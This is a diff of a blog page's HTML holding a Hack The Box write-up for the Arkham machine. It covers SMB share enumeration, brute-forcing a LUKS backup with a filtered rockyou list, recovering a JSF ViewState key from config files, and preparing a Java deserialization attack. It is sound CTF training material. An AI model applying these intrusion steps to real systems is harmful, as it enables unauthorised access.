@@ -3,24 +3,25 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
-<title>Hack The Box - Arkham | 0xRick Owned Root !</title>
-<meta name="generator" content="Jekyll v3.7.4" />
+<title>Hack The Box - Arkham | 0xRick</title>
+<meta name="generator" content="Jekyll v3.8.5" />
 <meta property="og:title" content="Hack The Box - Arkham" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Quick Summary Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is 10.10.10.130, I added it to /etc/hosts as arkham.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC arkham.htb We have http on port 80, 8080 and smb, I checked smb first. SMB Let’s use smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/arkham# smbclient –list //arkham.htb/ -U “” Enter WORKGROUP&#39;s password:" />
-<meta property="og:description" content="Quick Summary Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is 10.10.10.130, I added it to /etc/hosts as arkham.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC arkham.htb We have http on port 80, 8080 and smb, I checked smb first. SMB Let’s use smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/arkham# smbclient –list //arkham.htb/ -U “” Enter WORKGROUP&#39;s password:" />
+<meta name="description" content="My write-up for Arkham from Hack The Box." />
+<meta property="og:description" content="My write-up for Arkham from Hack The Box." />
 <link rel="canonical" href="http://localhost:4000/hack-the-box/arkham/" />
 <meta property="og:url" content="http://localhost:4000/hack-the-box/arkham/" />
-<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:site_name" content="0xRick" />
 <meta property="og:image" content="http://localhost:4000/hackthebox/arkham/0.png" />
 <meta property="og:type" content="article" />
 <meta property="article:published_time" content="2019-08-10T00:00:00+02:00" />
 <script type="application/ld+json">
-{"description":"Quick Summary Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is 10.10.10.130, I added it to /etc/hosts as arkham.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC arkham.htb We have http on port 80, 8080 and smb, I checked smb first. SMB Let’s use smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/arkham# smbclient –list //arkham.htb/ -U “” Enter WORKGROUP&#39;s password:","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/arkham/","image":"http://localhost:4000/hackthebox/arkham/0.png","headline":"Hack The Box - Arkham","dateModified":"2019-08-10T00:00:00+02:00","datePublished":"2019-08-10T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/arkham/"},"@context":"http://schema.org"}</script>
+{"description":"My write-up for Arkham from Hack The Box.","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/arkham/","image":"http://localhost:4000/hackthebox/arkham/0.png","headline":"Hack The Box - Arkham","dateModified":"2019-08-10T00:00:00+02:00","datePublished":"2019-08-10T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/arkham/"},"@context":"http://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
-<link rel="stylesheet" href="/assets/css/tagbuttons.css">
-  <link rel="stylesheet" href="/assets/css/ad.css">
-  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
+</head>
 <!-- Global site tag (gtag.js) - Google Analytics -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
 <script>
@@ -31,70 +32,72 @@
   gtag('config', 'UA-97164925-2');
 </script>
 
-<body><header class="site-header" role="banner">
-
-  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
-        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
-        <label for="nav-trigger">
-          <span class="menu-icon">
-            <svg viewBox="0 0 18 15" width="18px" height="15px">
-              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
-            </svg>
-          </span>
-        </label>
-
-        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
-      </nav></div>
-</header>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/"><i class="fab fa-twitter-square"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/0xRick"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
 <main class="page-content" aria-label="Content">
       <div class="wrapper">
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="author-box">
+<img src="/avatar.png" class="author-avatar" />
+<h7>
+	Ahmed Hesham<br>
+	CyberSec/InfoSec enthusiast. <br>
+	Interested in knowing how things work/Interested in breaking them, always learning.
+</h7>
+</div>
 
-  <header class="post-header">
-    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Arkham</h1>
-    <p class="post-meta">
-      <h7>
-        Tags: 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Windows/';">Windows</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/smb/';">smb</button> 
-        
-        <button class="tagbutton" onclick="window.location.href = '/tags/Cryptography/';">Cryptography</button> 
-        
-      </h7>
-      <br>
-      <time class="dt-published" datetime="2019-08-10T00:00:00+02:00" itemprop="datePublished">Aug 10, 2019
-      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
-</p>
-  </header>
+  <br>
+<div>
+	<h7>  &nbsp; Ad </h7>
+	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</div>
+<div class="post">
+  <h1 class="post-title">Hack The Box - Arkham</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/windows/">windows</a>
+      
+      <a class="tag" href="/tag/web/">web</a>
+      
+      <a class="tag" href="/tag/rce/">rce</a>
+      
+      <a class="tag" href="/tag/python/">python</a>
+      
+      <a class="tag" href="/tag/exploit-development/">exploit-development</a>
+      
+      <a class="tag" href="/tag/smb/">smb</a>
+      
+      <a class="tag" href="/tag/cryptography/">cryptography</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 10 Aug 2019</div>
+  
+  <div class="post-description">My write-up for Arkham from Hack The Box.</div>
+  
+  <hr />
 
-  <div class="post-content e-content" itemprop="articleBody">
-    <hr />
-
-<h3 id="quick-summary">Quick Summary</h3>
-<h4 id="hey-guys-today-arkham-retired-and-heres-my-write-up-about-it-this-box-was-a-challenging-one-and-i-enjoyed-it-a-lot-it-had-an-interesting-java-deserialization-vulnerability-which-is-the-best-thing-about-this-box-despite-the-fact-that-some-parts-were-annoying-this-box-was-great-its-a-windows-box-and-its-ip-is-101010130-i-added-it-to-etchosts-as-arkhamhtb-lets-jump-right-in-">Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.130</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">arkham.htb</code>. Let’s jump right in !</h4>
-<p><img src="/images/hackthebox/arkham/0.png" alt="" /></p>
+<h2 id="quick-summary">Quick Summary</h2>
+<p><br /> Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is <code class="highlighter-rouge">10.10.10.130</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">arkham.htb</code>. Let’s jump right in !
+<img src="/images/hackthebox/arkham/0.png" alt="" /></p>
 <hr />
 
-<h3 id="nmap">Nmap</h3>
-<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
-<p><code class="highlighter-rouge">nmap -sV -sT -sC arkham.htb</code>
-<img src="/images/hackthebox/arkham/1.png" alt="" /></p>
-<h4 id="we-have-http-on-port-80-8080-and-smb-i-checked-smb-first">We have <code class="highlighter-rouge">http</code> on port 80, 8080 and <code class="highlighter-rouge">smb</code>, I checked <code class="highlighter-rouge">smb</code> first.</h4>
-<p><br /></p>
+<h2 id="nmap">Nmap</h2>
+<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
+<code class="highlighter-rouge">nmap -sV -sT -sC arkham.htb</code>
+<img src="/images/hackthebox/arkham/1.png" alt="" />
+<br /> We have <code class="highlighter-rouge">http</code> on port 80, 8080 and <code class="highlighter-rouge">smb</code>, I checked <code class="highlighter-rouge">smb</code> first.
+<br /></p>
 <hr />
 
-<h3 id="smb">SMB</h3>
-<h4 id="lets-use-smbclient-to-list-the-shares-">Let’s use <code class="highlighter-rouge">smbclient</code> to list the shares :</h4>
+<h2 id="smb">SMB</h2>
+<p><br /> Let’s use <code class="highlighter-rouge">smbclient</code> to list the shares :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# smbclient --list //arkham.htb/ -U ""
 Enter WORKGROUP\'s password: 
 
@@ -109,7 +112,7 @@ Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to arkham.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Failed to connect with SMB1 -- no workgroup available
 </code></pre></div></div>
-<h4 id="users-is-an-interesting-share-name-i-checked-it-and-it-had-the-directories-for-guest-and-default-users-"><code class="highlighter-rouge">Users</code> is an interesting share name, I checked it and it had the directories for <code class="highlighter-rouge">Guest</code> and <code class="highlighter-rouge">default</code> users :</h4>
+<p><br /> <code class="highlighter-rouge">Users</code> is an interesting share name, I checked it and it had the directories for <code class="highlighter-rouge">Guest</code> and <code class="highlighter-rouge">default</code> users :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/Users/ -U ""
 Enter WORKGROUP\'s password: 
 Try "help" to get a list of possible commands.
@@ -123,7 +126,7 @@ smb: \&gt; ls
                 5158399 blocks of size 4096. 1899220 blocks available
 smb: \&gt; 
 </code></pre></div></div>
-<h4 id="i-enumerated-it-for-some-time-but-i-couldnt-find-anything-useful-so-i-checked-batshare-which-had-a-zip-archive-called-appserverzip-">I enumerated it for some time but I couldn’t find anything useful so I checked <code class="highlighter-rouge">BatShare</code> which had a <code class="highlighter-rouge">zip</code> archive called <code class="highlighter-rouge">appserver.zip</code> :</h4>
+<p><br /> I enumerated it for some time but I couldn’t find anything useful so I checked <code class="highlighter-rouge">BatShare</code> which had a <code class="highlighter-rouge">zip</code> archive called <code class="highlighter-rouge">appserver.zip</code> :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# smbclient //arkham.htb/BatShare -U ""
 Enter WORKGROUP\'s password: 
 Try "help" to get a list of possible commands.
@@ -135,12 +138,12 @@ smb: \&gt; ls
                 5158399 blocks of size 4096. 1897320 blocks available
 smb: \&gt; 
 </code></pre></div></div>
-<h4 id="i-downloaded-it-get-appserverzip-then-i-started-to-examine-it">I downloaded it (<code class="highlighter-rouge">get appserver.zip</code>) then I started to examine it.</h4>
-<p><br /></p>
+<p><br /> I downloaded it (<code class="highlighter-rouge">get appserver.zip</code>) then I started to examine it.
+<br /></p>
 <hr />
 
-<h3 id="decrypting-the-backup-image-luks-encrypted-image">Decrypting the Backup Image (LUKS Encrypted Image)</h3>
-<h4 id="after-unzipping-appserverzip-i-got-2-files-importanttxt-and-backupimg">After unzipping <code class="highlighter-rouge">appserver.zip</code> I got 2 files, <code class="highlighter-rouge">IMPORTANT.txt</code> and <code class="highlighter-rouge">backup.img</code></h4>
+<h2 id="decrypting-the-backup-image-luks-encrypted-image">Decrypting the Backup Image (LUKS Encrypted Image)</h2>
+<p><br /> After unzipping <code class="highlighter-rouge">appserver.zip</code> I got 2 files, <code class="highlighter-rouge">IMPORTANT.txt</code> and <code class="highlighter-rouge">backup.img</code></p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# mkdir appserver
 root@kali:~/Desktop/HTB/boxes/arkham# cd appserver/
 root@kali:~/Desktop/HTB/boxes/arkham/appserver# mv ../appserver.zip .
@@ -157,21 +160,21 @@ drwxr-xr-x 3 root root     4096 Aug  9 01:04 ..
 -rw-r--r-- 1 root root      149 Dec 25  2018 IMPORTANT.txt
 root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
 </code></pre></div></div>
-<h4 id="importanttxt-was-a-note-from-bruce-to-alfred-telling-him-that-this-is-the-backup-image-from-their-linux-server-"><code class="highlighter-rouge">IMPORTANT.txt</code> was a note from <code class="highlighter-rouge">Bruce</code> to <code class="highlighter-rouge">Alfred</code> telling him that this is the backup image from their Linux server :</h4>
+<p><br /> <code class="highlighter-rouge">IMPORTANT.txt</code> was a note from <code class="highlighter-rouge">Bruce</code> to <code class="highlighter-rouge">Alfred</code> telling him that this is the backup image from their Linux server :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# cat IMPORTANT.txt 
 Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce 
 root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
 </code></pre></div></div>
-<h4 id="backupimg-was-a-luks-encrypted-image-"><code class="highlighter-rouge">Backup.img</code> was a <code class="highlighter-rouge">LUKS</code> encrypted image :</h4>
+<p><br /> <code class="highlighter-rouge">Backup.img</code> was a <code class="highlighter-rouge">LUKS</code> encrypted image :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# file backup.img 
 backup.img: LUKS encrypted file, ver 1 [aes, xts-plain64, sha256] UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
 </code></pre></div></div>
-<h4 id="we-can-attempt-to-open-it-with-cryptsetup-but-of-course-we-will-need-a-password-">We can attempt to open it with <code class="highlighter-rouge">cryptsetup</code> but of course we will need a password :</h4>
+<p><br /> We can attempt to open it with <code class="highlighter-rouge">cryptsetup</code> but of course we will need a password :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# cryptsetup open --type luks backup.img test
 Enter passphrase for backup.img:
 </code></pre></div></div>
-<h4 id="we-can-use-a-tool-called-bruteforce-luks-to-bruteforce-the-password-but-using-it-with-rockyou-would-take-a-very-long-time-the-box-so-far-has-a-lot-of-batman-references-like-the-names-alfred-bruce-joker--and-the-share-name-batshare-also-the-comment-of-that-share--master-waynes-secrets">We can use a tool called <code class="highlighter-rouge">bruteforce-luks</code> to bruteforce the password, but using it with <code class="highlighter-rouge">rockyou</code> would take a very long time. The box so far has a lot of batman references, like the names <code class="highlighter-rouge">Alfred</code>, <code class="highlighter-rouge">Bruce</code>, <code class="highlighter-rouge">Joker</code>  and the share name <code class="highlighter-rouge">BatShare</code>, also the comment of that share : <code class="highlighter-rouge">Master Wayne's secrets</code>.</h4>
-<h4 id="i-took-all-the-passwords-from-rockyou-that-had-batman-in-them-and-created-a-custom-list-">I took all the passwords from <code class="highlighter-rouge">rockyou</code> that had <code class="highlighter-rouge">batman</code> in them and created a custom list :</h4>
+<p><br /> We can use a tool called <code class="highlighter-rouge">bruteforce-luks</code> to bruteforce the password, but using it with <code class="highlighter-rouge">rockyou</code> would take a very long time. The box so far has a lot of batman references, like the names <code class="highlighter-rouge">Alfred</code>, <code class="highlighter-rouge">Bruce</code>, <code class="highlighter-rouge">Joker</code>  and the share name <code class="highlighter-rouge">BatShare</code>, also the comment of that share : <code class="highlighter-rouge">Master Wayne's secrets</code>. 
+<br /> I took all the passwords from <code class="highlighter-rouge">rockyou</code> that had <code class="highlighter-rouge">batman</code> in them and created a custom list :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver# grep batman /usr/share/wordlists/rockyou.txt &gt; list.txt
 root@kali:~/Desktop/HTB/boxes/arkham/appserver# bruteforce-luks -f ./list.txt ./backup.img 
 Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.
@@ -183,12 +186,12 @@ Last tried password: batmanforever
 Password found: batmanforever
 root@kali:~/Desktop/HTB/boxes/arkham/appserver# 
 </code></pre></div></div>
-<h4 id="it-worked-and-the-password-was-batmanforever">It worked and the password was <code class="highlighter-rouge">batmanforever</code>.</h4>
-<p><img src="/images/hackthebox/arkham/2.png" alt="" />
+<p><br /> It worked and the password was <code class="highlighter-rouge">batmanforever</code>.
+<img src="/images/hackthebox/arkham/2.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/arkham/3.png" alt="" /></p>
-<h4 id="it-had-a-directory-called-mask-so-i-copied-it-then-i-unmounted-the-image">It had a directory called <code class="highlighter-rouge">Mask</code> so I copied it then I unmounted the image.</h4>
+<img src="/images/hackthebox/arkham/3.png" alt="" />
+<br /> It had a directory called <code class="highlighter-rouge">Mask</code> so I copied it then I unmounted the image.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# ls -la
 total 18
 drwxr-xr-x  4 root root  1024 Dec 25  2018 .
@@ -199,7 +202,7 @@ root@kali:/media/root/af474e94-894e-4bb6-897a-adc82884b3d8# cd -                
 root@kali:~/Desktop/HTB/boxes/arkham/appserver# cp -r /media/root/af474e94-894e-4bb6-897a-adc82884b3d8/Mask/ .
 root@kali:~/Desktop/HTB/boxes/arkham/appserver#
 </code></pre></div></div>
-<h4 id="there-were-some-useless-stuff-that-i-didnt-really-care-about-there-was-a-directory-called-tomcat-stuff-which-had-some-web-server-configuration-files-that-one-was-interesting">There were some useless stuff that I didn’t really care about, there was a directory called <code class="highlighter-rouge">tomcat-stuff</code> which had some web server configuration files, that one was interesting.</h4>
+<p><br /> There were some useless stuff that I didn’t really care about, there was a directory called <code class="highlighter-rouge">tomcat-stuff</code> which had some web server configuration files, that one was interesting.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask# ls -la
 total 896
 drwxr-xr-x 4 root root   4096 Aug  9 01:32 .
@@ -231,23 +234,23 @@ drwxr-xr-x 4 root root   4096 Aug  9 01:32 ..
 -rw-r--r-- 1 root root 199998 Aug  9 01:32 Batman-Begins.pdf
 root@kali:~/Desktop/HTB/boxes/arkham/appserver/Mask/docs# 
 </code></pre></div></div>
-<h4 id="we-have-the-server-configuration-files-however-we-havent-checked-any-of-the-http-ports-yet">We have the server configuration files, However we haven’t checked any of the <code class="highlighter-rouge">http</code> ports yet.</h4>
-<p><br /></p>
+<p><br /> We have the server configuration files, However we haven’t checked any of the <code class="highlighter-rouge">http</code> ports yet.
+<br /></p>
 <hr />
 
-<h4 id="http-enumeration">HTTP Enumeration</h4>
-<h4 id="port-80-had-nothing-running-there-was-only-the-default-iis-index-page-and-no-subdirectories">Port 80 had nothing running, there was only the default <code class="highlighter-rouge">IIS</code> index page and no subdirectories.</h4>
-<p><img src="/images/hackthebox/arkham/4.png" alt="" /></p>
-<h4 id="on-port-8080-there-was-a-website-with-some-links-">On port 8080 there was a website with some links :</h4>
-<p><img src="/images/hackthebox/arkham/5.png" alt="" /></p>
-<h4 id="one-of-the-links-was-the-subscription-link--httparkhamhtb8080usersubscribefaces">One of the links was the subscription link : <code class="highlighter-rouge">http://arkham.htb:8080/userSubscribe.faces</code></h4>
-<p><img src="/images/hackthebox/arkham/6.png" alt="" /></p>
-<h4 id="i-tested-it-to-see-what-will-happen-">I tested it to see what will happen :</h4>
-<p><img src="/images/hackthebox/arkham/7.png" alt="" />
+<p><br /> HTTP Enumeration
+<br /> Port 80 had nothing running, there was only the default <code class="highlighter-rouge">IIS</code> index page and no subdirectories.
+<img src="/images/hackthebox/arkham/4.png" alt="" />
+<br /> On port 8080 there was a website with some links :
+<img src="/images/hackthebox/arkham/5.png" alt="" />
+<br /> One of the links was the subscription link : <code class="highlighter-rouge">http://arkham.htb:8080/userSubscribe.faces</code>
+<img src="/images/hackthebox/arkham/6.png" alt="" />
+<br /> I tested it to see what will happen :
+<img src="/images/hackthebox/arkham/7.png" alt="" />
 <br />
 <br />
-<img src="/images/hackthebox/arkham/8.png" alt="" /></p>
-<h4 id="nothing-interesting-i-intercepted-the-request-with-burp-and-found-some-interesting-parameters-in-the-post-request-">Nothing interesting, I intercepted the request with <code class="highlighter-rouge">burp</code> and found some interesting parameters in the POST request :</h4>
+<img src="/images/hackthebox/arkham/8.png" alt="" />
+<br /> Nothing interesting, I intercepted the request with <code class="highlighter-rouge">burp</code> and found some interesting parameters in the POST request :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /userSubscribe.faces HTTP/1.1
 Host: arkham.htb:8080
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
@@ -266,34 +269,26 @@ j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&am
 <p><br /></p>
 <hr />
 
-<h3 id="jsf-viewstate-deserialization-vulnerability">JSF ViewState Deserialization Vulnerability</h3>
-<h4 id="the-page-had-faces-extension-and-the-post-request-had-a-parameter-called-javaxfacesviewstate">The page had <code class="highlighter-rouge">.faces</code> extension and the POST request had a parameter called <code class="highlighter-rouge">javax.faces.ViewState</code>.</h4>
-<h4 id="after-some-research-i-knew-that-this-parameter-holds-a-java-serialized-object-this-means-that-there-is-a-potential-deserialization-vulnerability">After some research I knew that this parameter holds a java serialized object, this means that there is a potential deserialization vulnerability.</h4>
-<p><br /></p>
+<h2 id="jsf-viewstate-deserialization-vulnerability">JSF ViewState Deserialization Vulnerability</h2>
+<p><br /> The page had <code class="highlighter-rouge">.faces</code> extension and the POST request had a parameter called <code class="highlighter-rouge">javax.faces.ViewState</code>. 
+<br /> After some research I knew that this parameter holds a java serialized object, this means that there is a potential deserialization vulnerability.
+<br /></p>
 
-<h4 id="some-resources-if-you-are-unfamiliar-with-deserialization-vulnerabilities-">Some resources if you are unfamiliar with deserialization vulnerabilities :</h4>
+<p><br /> Some resources if you are unfamiliar with deserialization vulnerabilities :</p>
 <ul>
-  <li>
-    <h4 id="misconfigured-jsf-viewstates-can-lead-to-severe-rce-vulnerabilities"><a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a></h4>
-  </li>
-  <li>
-    <h4 id="exploiting-blind-java-deserialization-with-burp-and-ysoserial"><a href="https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/">Exploiting blind Java deserialization with Burp and Ysoserial</a></h4>
-  </li>
-  <li>
-    <h4 id="how-i-found-a-1500-worth-deserialization-vulnerability"><a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a">How i found a 1500$ worth Deserialization vulnerability</a></h4>
-  </li>
-  <li>
-    <h4 id="encrypted-java-serialized-rce-this-helped-me-to-know-how-to-encrypt-the-data"><a href="https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d">Encrypted Java Serialized RCE</a> (This helped me to know how to encrypt the data)</h4>
-  </li>
+  <li><br /> <a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html">Misconfigured JSF ViewStates can lead to severe RCE vulnerabilities</a></li>
+  <li><br /> <a href="https://www.n00py.io/2017/11/exploiting-blind-java-deserialization-with-burp-and-ysoserial/">Exploiting blind Java deserialization with Burp and Ysoserial</a></li>
+  <li><br /> <a href="https://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a">How i found a 1500$ worth Deserialization vulnerability</a></li>
+  <li><br /> <a href="https://gist.github.com/cdowns71/76d99ad0829ceef3a83761dbeee3b66d">Encrypted Java Serialized RCE</a> (This helped me to know how to encrypt the data)</li>
 </ul>
 
 <p><br /></p>
 
-<h4 id="when-i-tried-to-decode-the-base-64-encoded-value-i-got-nothing-readable">When I tried to decode the base-64 encoded value I got nothing readable:</h4>
-<p><img src="/images/hackthebox/arkham/9.png" alt="" /></p>
-<h4 id="i-redirected-the-output-into-a-file-and-ran-file-command-against-it-and-i-got-data-instead-of-java-serialization-data">I redirected the output into a file and ran <code class="highlighter-rouge">file</code> command against it, and I got <code class="highlighter-rouge">data</code> instead of <code class="highlighter-rouge">Java serialization data</code>.</h4>
-<h4 id="this-means-that-the-serialized-data-are-encrypted-luckily-we-have-the-server-configuration-files-its-time-to-check-them">This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.</h4>
-<h4 id="in-webxmlbak-i-found-the-key-used-to-encrypt-the-data-also-the-mac-algorithm-which-was-hmac-sha1-and-the-used-key">In <code class="highlighter-rouge">web.xml.bak</code> I found the key used to encrypt the data, also the MAC algorithm which was <code class="highlighter-rouge">hmac-sha1</code> and the used key.</h4>
+<p><br /> When I tried to decode the base-64 encoded value I got nothing readable:
+<img src="/images/hackthebox/arkham/9.png" alt="" />
+<br /> I redirected the output into a file and ran <code class="highlighter-rouge">file</code> command against it, and I got <code class="highlighter-rouge">data</code> instead of <code class="highlighter-rouge">Java serialization data</code>.
+<br /> This means that the serialized data are encrypted. Luckily we have the server configuration files, it’s time to check them.
+<br /> In <code class="highlighter-rouge">web.xml.bak</code> I found the key used to encrypt the data, also the MAC algorithm which was <code class="highlighter-rouge">hmac-sha1</code> and the used key.</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ----------------
      Removed Output
     ----------------
@@ -315,14 +310,14 @@ j_id_jsp_1623871077_1%3Aemail=test&amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&am
      Removed Output
     ----------------
 </code></pre></div></div>
-<h4 id="the-same-key-was-used--snngotg3ni0-its-base-64-encoded-so-we-need-to-decode-it-">The same key was used : <code class="highlighter-rouge">SnNGOTg3Ni0=</code>, it’s base-64 encoded so we need to decode it :</h4>
+<p><br /> The same key was used : <code class="highlighter-rouge">SnNGOTg3Ni0=</code>, it’s base-64 encoded so we need to decode it :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/arkham# echo SnNGOTg3Ni0= | base64 -d
 JsF9876-
 </code></pre></div></div>
-<h4 id="the-key-is-jsf9876-">The key is <code class="highlighter-rouge">JsF9876-</code>.</h4>
-<h4 id="we-have-everything-we-need-to-encrypt-the-data-correctly-i-wrote-a-python-script-to-do-it">We have everything we need to encrypt the data correctly, I wrote a python script to do it.</h4>
-<h4 id="basically-im-going-to-create-the-payload-with-ysoserial-then-use-my-script-to-encrypt-it">Basically I’m going to create the payload with <a href="https://github.com/frohoff/ysoserial"><code class="highlighter-rouge">ysoserial</code></a> then use my script to encrypt it.</h4>
